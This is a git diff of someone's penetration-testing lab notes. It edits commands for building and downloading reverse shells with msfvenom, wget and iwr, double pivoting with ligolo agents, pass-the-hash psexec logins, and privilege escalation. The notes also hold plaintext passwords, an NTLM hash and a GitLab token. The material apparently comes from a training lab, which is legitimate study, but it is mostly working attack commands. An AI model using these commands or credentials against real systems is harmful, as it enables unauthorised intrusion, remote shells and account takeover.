@@ -141,8 +141,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe
 nc -nvlp 8888
 iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
 .\shell.exe
-
-
 ```
 
 .221 privesc
@@ -228,7 +226,7 @@ sudo ip link set ligolo up
 >> start
 
 # add route to internal network
-sudo ip route add 10.10.119.0/24 dev ligolo
+sudo ip route add 10.10.84.0/24 dev ligolo
 
 # from windows target C:/Users/kiosk
 iwr -uri http://192.168.45.229/agent.exe -Outfile agent.exe
@@ -259,7 +257,7 @@ impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76
 ```
 # 22,5901
 sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
-vncviewer 10.10.119.10::5901
+vncviewer 10.10.84.10::5901
 # need password from 220 - the first password works
 passwd=R3S3+rcH
 passwd2=ABCDEFGH
@@ -281,16 +279,17 @@ vi scratchpad/.gitlab-ci.yml
 
 # setup pivot to 14 - use this guide to double pivot https://4pfsec.com/ligolo
 # add listener on existing session
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11061 --tcp
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 
 # download agent on the second machine
 wget http://192.168.45.229/agent -O agent
 chmod +x agent
 # connect to the first machine we proxied to from kali
-./agent -connect 192.168.229.221:11601 -ignore-cert
+./agent -connect 192.168.194.221:11601 -ignore-cert
+
 # try this ifcant connect to 11601
 listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11061 --tcp
-./agent -connect 192.168.229.221:9999 -ignore-cert
+./agent -connect 192.168.229.221:8000 -ignore-cert
 # from kali
 session
 # switch to newly added session
@@ -299,7 +298,7 @@ session
 sudo ip route add 10.20.119.0/24 dev ligolo
 
 # verify connectivity
-nmap 10.20.119.14 -p 80  
+nmap 10.20.84.14 -p 80  
 
 # get shell on 14
 cd scratchpad
@@ -318,6 +317,11 @@ glpat-PzrxBe-5Js7c3t7hoq4X
 .14 privesc
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# get better shell
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.229 LPORT=4444 -f raw -o shell.sh
+wget http://192.168.45.229/shell.sh -O shell.sh
+
 wget http://192.168.45.229/linpeas.sh -O linpeas.sh
 
 # don't seem to do anything
@@ -337,6 +341,11 @@ wget http://192.168.45.229/pspy64 -O pspy
 
 find . -name local.txt 2>/dev/null
 /bin/bash /opt/fs_checks/fs.sh
+
+# modify the helper for this script
+cat /opt/fs_checks/fs.sh
+cat /opt/u/__fs.sh
+
 ```
 
 .11
